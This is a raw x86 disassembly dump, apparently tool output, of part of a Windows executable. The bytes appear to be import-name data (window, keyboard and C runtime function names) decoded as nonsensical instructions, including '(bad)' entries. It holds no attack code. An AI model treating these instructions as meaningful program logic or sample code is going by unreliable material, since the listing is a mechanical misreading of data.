  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
